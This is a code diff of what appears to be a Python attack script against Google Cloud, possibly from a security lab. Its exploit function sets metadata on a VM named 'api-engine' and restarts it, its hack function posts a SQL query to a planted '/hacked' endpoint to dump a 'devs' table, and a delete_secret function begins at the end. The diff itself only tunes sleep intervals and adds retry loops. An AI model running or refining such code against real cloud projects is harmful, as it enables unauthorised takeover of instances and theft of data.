@@ -241,10 +241,10 @@ def exploit(nonce, logging_key):
     compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()
     compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
-        time.sleep(2)
+        time.sleep(5)
     compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
-        time.sleep(2)
+        time.sleep(5)
     shutil.rmtree(temp_dir)
 
     #returns External IP of the restarted vm
@@ -256,11 +256,18 @@ def hack(hostname):
     url = f'http://{hostname}/hacked'
 
     payload = {'sql': 'select * from devs;'}
-    response = requests.post(url, data=payload)
-    while(response.status_code != 200):
-        time.sleep(10)
-        response = requests.post(url, data=payload)
-    print(response.text)
+    success = False    
+    while(not success):
+        try:
+            response = requests.post(url, data=payload)
+            if(response.status_code != 200):
+                success = False
+                time.sleep(5)
+            else: success = True
+        except:
+            time.sleep(5)            
+            success = False
+    print(response.text)     
 
 def delete_secret(secret_id):
     _, project_id = google.auth.default()
